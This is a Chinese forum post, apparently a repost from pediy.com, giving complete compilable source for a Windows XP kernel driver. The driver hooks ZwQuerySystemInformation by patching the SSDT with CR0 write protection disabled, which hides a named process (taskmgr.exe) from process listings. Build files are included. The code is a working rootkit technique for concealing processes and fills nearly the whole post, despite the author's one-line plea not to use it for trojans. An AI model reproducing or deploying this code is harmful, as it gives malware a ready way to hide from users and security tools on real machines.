
# Hook 内核 ntoskrnl'sZwQuerySystemInformation 隐藏任务管理器进程名

> 原文：[`www.pediy.com/kssd/pediy08/pediy8-733.htm`](https://www.pediy.com/kssd/pediy08/pediy8-733.htm)

原理：通过修改内核 `ntoskrnl` 的服务表结构体 `KeServiceDescriptorTable`，计算出 `ZwQuerySystemInformation` 的地址，然后替换成自己的 `MyZwQuerySystemInformation`，然后断掉过滤要隐藏的进程名。

网上 hook `ZwQuerySystemInformation` 隐藏进程的很多，但是大都是文字说明偏多，很多给出的代码不可以编译，所以自己参照了很多文章编译了成功了。

有一段取 `ZwQuerySystemInformation` 的服务指针，我是用的汇编写的。

文件输出是驱动文件 `SYS`，加载它就可以隐藏所要的进程名了。不要拿来搞木马害我。

完整代码文件和编译好的都在附件中！

```cpp
#include <ntddk.h>  

#include <string.h>  

VOID UnloadDriver(IN PDRIVER_OBJECT DriverObject);  

///////////////////定义本地结构体//////////////////////////////////////////  

struct _SYSTEM_THREADS  
{  
  LARGE_INTEGER KernelTime;  
  LARGE_INTEGER UserTime;  
  LARGE_INTEGER CreateTime;  
  ULONG WaitTime;  
  PVOID StartAddress;  
  CLIENT_ID ClientIs;  
  KPRIORITY Priority;  
  KPRIORITY BasePriority;  
  ULONG ContextSwitchCount;  
  ULONG ThreadState;  
  KWAIT_REASON WaitReason;  
};  

struct _SYSTEM_PROCESSES  
{  
  ULONG NextEntryDelta;  
  ULONG ThreadCount;  
  ULONG Reserved[6];  
  LARGE_INTEGER CreateTime;  
  LARGE_INTEGER UserTime;  
  LARGE_INTEGER KernelTime;  
  UNICODE_STRING ProcessName;  
  KPRIORITY BasePriority;  
  ULONG ProcessId;  
  ULONG InheritedFromProcessId;  
  ULONG HandleCount;  
  ULONG Reserved2[2];  
  VM_COUNTERS VmCounters;  
  IO_COUNTERS IoCounters;  
  struct _SYSTEM_THREADS Threads[1];  
};  

///////////////声明 Native API///////////////////////////////////////  

NTSYSAPI NTSTATUS NTAPI ZwQuerySystemInformation(  
    IN ULONG SystemInformationClass,  
    IN PVOID SystemInformation,  
    IN ULONG SystemInformationLength,  
    OUT PULONG ReturnLength);  

typedef NTSTATUS (*ZWQUERYSYSTEMINFORMATION)(  
          IN ULONG SystemInformationClass,  
          IN PVOID SystemInformation,  
          IN ULONG SystemInformationLength,  
          OUT PULONG ReturnLength);  

NTSTATUS MyZwQuerySystemInformation(  
    IN ULONG SystemInformationClass,  
    IN PVOID SystemInformation,  
    IN ULONG SystemInformationLength,  
    OUT PULONG ReturnLength);  

/////////////////定义 ntoskrnl.exe 的服务表结构////////////////////////////////////////////////  

typedef struct _ServiceDescriptorEntry {   
        unsigned int *ServiceTableBase;  
        unsigned int *ServiceCounterTableBase;  
        unsigned int NumberOfServices;  
        unsigned char *ParamTableBase;  
    }ServiceDescriptorTableEntry, *PServiceDescriptorTableEntry;  

////////////////////定义所用到的全局变量///////////////  

extern PServiceDescriptorTableEntry KeServiceDescriptorTable;  

ZWQUERYSYSTEMINFORMATION OldZwQuerySystemInformation;  
unsigned long OldCr0;  
UNICODE_STRING DeviceNameString;  
UNICODE_STRING LinkDeviceNameString;  

NTSTATUS DriverEntry (IN PDRIVER_OBJECT DriverObject,IN PUNICODE_STRING RegistryPath)  

{  
 NTSTATUS status;  
 PDEVICE_OBJECT   deviceObject;  
   RtlInitUnicodeString( &DeviceNameString,    L"\\Device\\HideProcess" );  
   RtlInitUnicodeString( &LinkDeviceNameString,L"\\DosDevices\\HideProcess" );  
    KdPrint(("DriverEntry Enter............................\n"));  
   status = IoCreateDevice(  
            DriverObject,  
            0,                 
            &DeviceNameString,  
            FILE_DEVICE_DISK_FILE_SYSTEM,  
            FILE_DEVICE_SECURE_OPEN,  
            FALSE,  
            & deviceObject );  
    if (!NT_SUCCESS( status ))  
    {  
        KdPrint(( "DriverEntry: Error creating control device object, status=%08x\n", status ));  
        return status;  
    }  
   status = IoCreateSymbolicLink(  
            (PUNICODE_STRING) &LinkDeviceNameString,  
            (PUNICODE_STRING) &DeviceNameString  
            );  
   if (!NT_SUCCESS(status))  
    {  
        IoDeleteDevice(deviceObject);  
        return status;  
    }  
  DriverObject->DriverUnload=UnloadDriver;  

//////////////////////Hook ZwQuerySystemInformation/////////////////////////////////////////////////  
 _asm{  
        cli;  
        mov eax,cr0  
        mov OldCr0,eax  
        and eax,0fffeffffh  
        mov cr0,eax  
    }  

_asm{  
          mov     ecx, dword ptr [ZwQuerySystemInformation];  
          mov     edx, [ecx+1];  
          mov     eax, dword ptr [KeServiceDescriptorTable];  
          mov     esi, [eax];  
          mov     edx, [esi+edx*4];  
          mov     dword ptr [OldZwQuerySystemInformation], edx  
          mov     ecx, [ecx+1]  
          mov     eax, [eax]  
          mov     dword ptr [eax+ecx*4], offset MyZwQuerySystemInformation;  
    }  
  _asm  
    {  
        mov eax,OldCr0  
        mov cr0,eax  
        sti;  
    }  

KdPrint(("Hook ZwQuerySystemInformation'status is Succeessfully "));  

return status ;  

}  

VOID UnloadDriver(IN PDRIVER_OBJECT DriverObject)//卸载驱动程序和钩子  

{  
    UNICODE_STRING uniWin32NameString;  
    UNICODE_STRING LinkNameString;  
    PDEVICE_OBJECT deviceObject;  

//////////////////////UnHook ZwQuerySystemInformation/////////////////////////////////////////////////  
 _asm{  
        cli;  
        mov eax,cr0  
        mov OldCr0,eax  
        and eax,0fffeffffh  
        mov cr0,eax  
    }  

_asm{  
        mov     ecx, dword ptr [ZwQuerySystemInformation];  
        mov     edx, [ecx+1];  
        mov     eax, dword ptr [KeServiceDescriptorTable];  
        mov     esi, [eax];  
        mov     ebx, dword ptr [OldZwQuerySystemInformation];  
        mov     [esi+edx*4],ebx;  
    }  

_asm  
   {  
        mov eax,OldCr0  
        mov cr0,eax  
        sti;  
    }  
    KdPrint(("UnHookZwQuerySystemInformation'status is Succeessfully................... "));  
    deviceObject= DriverObject->DeviceObject;  
    IoDeleteSymbolicLink(&LinkDeviceNameString);  
    ASSERT(!deviceObject->AttachedDevice);  
    if ( deviceObject != NULL )  
    {  
        IoDeleteDevice( deviceObject );  
    }  

}  

NTSTATUS MyZwQuerySystemInformation(  
    IN ULONG SystemInformationClass,  
    IN PVOID SystemInformation,  
    IN ULONG SystemInformationLength,  
    OUT PULONG ReturnLength)  //定义自己的 Hook 函数  

{  
  NTSTATUS rc;  
  UNICODE_STRING process_name;  
  RtlInitUnicodeString(&process_name, L"taskmgr.exe");//改成自己要隐藏的进程名  
  rc = (OldZwQuerySystemInformation) (  
    SystemInformationClass,  
    SystemInformation,  
    SystemInformationLength,  
    ReturnLength);  
  if(NT_SUCCESS(rc))  
  {  
    if(5 == SystemInformationClass)  
    {  
      struct _SYSTEM_PROCESSES *curr = (struct _SYSTEM_PROCESSES *)SystemInformation;  
      struct _SYSTEM_PROCESSES *prev = NULL;  
      if(curr->NextEntryDelta)((char *)curr += curr->NextEntryDelta);  
      while(curr)  
      {  
                    if (RtlEqualUnicodeString(&process_name, &curr->ProcessName, 1))  
        {  
                    KdPrint(("hide process'name taskmgr.exe"));  
          if(prev)  
          {  
            if(curr->NextEntryDelta)  
            {  
              prev->NextEntryDelta += curr->NextEntryDelta;  
            }  
            else  
            {  
              prev->NextEntryDelta = 0;  
            }  
          }  
          else  
          {  
            if(curr->NextEntryDelta)  
            {  
              (char *)SystemInformation += curr->NextEntryDelta;  
            }  
            else  
            {  
              SystemInformation = NULL;  
            }  
          }  
          if(curr->NextEntryDelta)((char *)curr += curr->NextEntryDelta);  
          else  
          {  
```



```
    curr = NULL;  
    break;  
  }  
}  
if(curr != NULL)  
{  
  prev = curr;  
  if(curr->NextEntryDelta)((char \*)curr += curr->NextEntryDelta);  
  else curr = NULL;  
}  
}  
}  
}  
KdPrint(("HookZwQuerySystemInformation status is Successfully................... "));  
return rc;  
}  
```

`////////////////////////makefile///////////////////////////////////////////////////`

```
#  
# DO NOT EDIT THIS FILE!!! Edit .\sources. if you want to add a new source  
# file to this component. This file merely indirects to the real make file  
# that is shared by all the components of Windows NT  
#  
!INCLUDE $(NTMAKEENV)\makefile.def  
//////////////////////////////////////////////////////////////////////////  
///////////////////////sources//////////////////////////////////////////////////  
TARGETNAME=HookZwQuerySystemInformation  
TARGETPATH=obj  
TARGETTYPE=DRIVER  
BROWSER_INFO=1  
SOURCES=ZwQuerySystemInformation.c  
/////////////////////////////////////////////////////////////////////////  
```

环境 `xp`, `sp2`, `DDK2003` `Build`...

在其他平台先编译一边源代码.

附件：`hook_zwquerysysteminformation.rar`

`4dd466d0e1e0cc123afbe504da2462ca`
